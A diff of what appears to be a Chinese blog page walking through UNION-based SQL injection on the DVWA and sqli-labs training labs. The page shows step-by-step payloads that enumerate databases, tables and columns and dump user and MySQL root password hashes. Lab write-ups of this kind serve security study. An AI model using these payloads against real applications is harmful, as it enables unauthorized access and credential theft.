@@ -469,19 +469,19 @@
 <p>5.获取数据库中的表</p>
 <p>6.获取表中的字段名</p>
 <p>7.查询到账户的数据</p>
-<h2 id="SQL详细注入过程"><a href="#SQL详细注入过程" class="headerlink" title="SQL详细注入过程"></a>SQL详细注入过程</h2><p>猜数据库：</p>
+<h2 id="SQL详细注入过程"><a href="#SQL详细注入过程" class="headerlink" title="SQL详细注入过程"></a>SQL详细注入过程</h2><p>（1）猜数据库：</p>
 <p>1’ union select 1,database()</p>
 <p>payload 利用另一种方式：</p>
 <p>1’ union select user(),database()</p>
 <p>version()</p>
 <p>得到数据库名：dvwa</p>
-<p>PS：union 查询结合了两个 select 查询结果，根据上面的 order by 语句我们知道查询包含两列，为了能够现实两列查询结果，我们需要用 union 查询结合我们构造的另外一个 select.注意在使用 union 查询的时候需要和主查询的列数相同。</p>
-<p>猜表名：</p>
-<p>1’ union select 1,group_concat(table_name) from information_schema.tables where</p>
-<p>table_schema =database()</p>
+<p>PS：union 查询结合了两个 select 查询结果，根据上面的 order by 语句我们知道查询包含两列，为了能够现实两列查询结果，我们需要用 union 查询结合我们构造的另外一个 select</p>
+<p>注意在使用 union 查询的时候需要和主查询的列数相同。</p>
+<p>（2）猜表名：</p>
+<p>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema =database()</p>
 <p>得到表名：guestbook,users</p>
 <p>group_concat 分组</p>
-<p>猜列名：</p>
+<p>（3）猜列名：</p>
 <p>1’ union select 1,group_concat(column_name) from information_schema.columns</p>
 <p>where table_name =0x7573657273#</p>
 <p>1’ union select 1,group_concat(column_name) from information_schema.columns</p>
@@ -489,7 +489,8 @@
 <p>(用编码就不用单引号，用单引号就不用编码)</p>
 <p>得到列：</p>
 <p>user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,usernam</p>
-<p>e,password猜用户数据：</p>
+<p>e,password</p>
+<p>（4）猜用户数据：</p>
 <p>列举出几种 payload:</p>
 <p>1’ or 1=1 union select</p>
 <p>group_concat(user_id,first_name,last_name),group_concat(password) from users #</p>
@@ -498,10 +499,11 @@
 <p>users #</p>
 <p>得到用户数据：</p>
 <p>admin 5f4dcc3b5aa765d61d8327deb882cf99</p>
-<p>猜 root 用户：#</p>
+<p>（5）猜 root 用户：#</p>
 <p>1’ union select 1,group_concat(user,password) from mysql.user#</p>
 <p>得到 root 用户信息：</p>
 <p>root*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</p>
+<h1 id="union-联合注入"><a href="#union-联合注入" class="headerlink" title="union 联合注入"></a>union 联合注入</h1><h2 id="union-联合注入原理"><a href="#union-联合注入原理" class="headerlink" title="union 联合注入原理"></a>union 联合注入原理</h2><p>​		联合查询注入是联合两个表进行注入攻击，使用关键词 union select 对两个表进行联合查询。两个表的字段要数要相同，不然会出现报错。</p>
 <h1 id="sqli-labs-master练习"><a href="#sqli-labs-master练习" class="headerlink" title="sqli-labs-master练习"></a>sqli-labs-master练习</h1><h2 id="Less-1（基于错误的GET单引号字符型注入）"><a href="#Less-1（基于错误的GET单引号字符型注入）" class="headerlink" title="Less-1（基于错误的GET单引号字符型注入）"></a>Less-1（基于错误的GET单引号字符型注入）</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">联合查询注⼊流程&nbsp;</span><br><span class="line">1、判断原有查询语句字段数数</span><br><span class="line">2、使原来查询语句的查询结果为空</span><br><span class="line">3、判断查询结果输出位置</span><br><span class="line">4、使⽤ union 操作符拼接 payload 语句</span><br><span class="line">5、利⽤ payload 进⾏数据查询</span><br></pre></td></tr></tbody></table></figure>
 
 <blockquote>
@@ -1092,7 +1094,7 @@
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2024</span>
+                <span id="year">2024-2025</span>
             
             <span id="year">2024</span>
             <a href="/about" target="_blank">HMX</a>
@@ -1101,7 +1103,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">79.4k</span>&nbsp;字
+                class="white-color">113.7k</span>&nbsp;字
             
             
             
